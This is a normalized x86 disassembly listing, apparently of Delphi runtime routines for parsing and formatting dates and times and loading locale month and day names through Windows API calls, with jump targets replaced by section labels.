mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409878
pop ecx
mov al [ eax + lookup_table_409d1f ]
jmp [ eax * 4 + jump_table_409d58 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409928
pop ecx
push ebp
call sub_409954
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409928
pop ecx
push ebp
call sub_409954
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_4099cc
pop ecx
mov eax [ ebp - 0x24 ]
call sub_4098bc
pop ecx
jmp r-xdata
push ebp
call sub_409928
pop ecx
push ebp
call sub_409954
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409b34
pop ecx
mov eax [ ebp - 0x28 ]
call sub_4098bc
pop ecx
jmp r-xdata
push ebp
call sub_409928
pop ecx
push ebp
call sub_409954
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409928
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409928
pop ecx
push ebp
call sub_40998c
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409928
pop ecx
push ebp
call sub_40998c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409928
pop ecx
push ebp
call sub_40998c
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409928
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409928
pop ecx
push ebp
call sub_40998c
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40998c
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408644
test eax eax
jne r-xdata
push ebp
call sub_409928
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c3c
pop ecx
push ebp
call sub_40998c
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_4098dc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_4098dc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_4098dc
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409954
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_4098dc
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_4098dc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_4098dc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c3c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c3c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4098dc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408644
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409878
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c3c
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409878
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409878
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4098bc
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4097ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4098bc
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408644
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409878
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409878
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_4098bc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4097ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4098bc
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c104
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408644
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409878
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c3c
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_4098dc
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408644
test eax eax
jne r-xdata
push ebp
call sub_409954
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4097ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4098bc
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4098bc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4098bc
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c104
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409c3c
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409878
pop ecx
jmp r-xdata
push ebp
call sub_409954
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4097ec
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_4098bc
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408644
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408644
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408644
test eax eax
jne r-xdata
jmp r-xdata
sub_40a3f0
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_409c3c
pop ecx
push ebp
mov eax ebx
call sub_409c3c
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_403f44
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a460
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_404114
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a484
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a460
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_404114
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a518
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a591
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a598
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a460
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_404114
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_404374
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407c08
test eax eax
jne r-xdata
mov eax edi
call sub_404114
add [ esi ] eax
mov bl 0x1
sub_40a5a4
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a460
mov eax esi
call sub_404114
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a5dc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_404114
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a628
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_404114
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40c148
mov [ ebx ] eax
jmp r-xdata
sub_40a670
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_404314
push eax
mov eax [ ebx ]
call sub_404314
pop edx
call sub_40c300
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a6c4
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_409864
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a720
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40aa3b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a5dc
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40c23c
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a484
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a628
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_404374
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407c78
mov eax [ ebp - 0x1c ]
call sub_40a670
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40aa42
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403e78
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a5a4
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a484
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a5a4
test al al
je r-xdata
call sub_409864
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a484
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409588
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404458
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a5a4
mov edx ebx
mov eax esi
call sub_40a460
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_404114
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a628
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a6c4
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a460
mov eax esi
call sub_404114
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_409864
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_404114
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404374
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407c08
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_404114
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_404374
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407c08
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40aa64
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a518
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a518
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a518
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a484
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a460
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a518
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a5a4
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a484
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a518
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a5a4
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a460
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409440
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a518
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a484
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a518
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a5a4
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a518
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a484
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40ac58
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40aa64
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_404114
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40ac8c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a720
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40ac58
mov ebx eax
jmp r-xdata
mov eax esi
call sub_404114
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40aa64
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40ad18
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_403f44
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40ad64
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403ea8
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_403f44
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40adb0
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40add8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40ad64
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_4059b8
sub_40ae14
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40af27
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40add8
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403ea8
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40add8
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403ea8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40add8
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403ea8
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40add8
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403ea8
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40af2e
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403e78
retn
sub_40af38
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_40404c
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40af74
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40afd9
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_40404c
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_407ef0
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
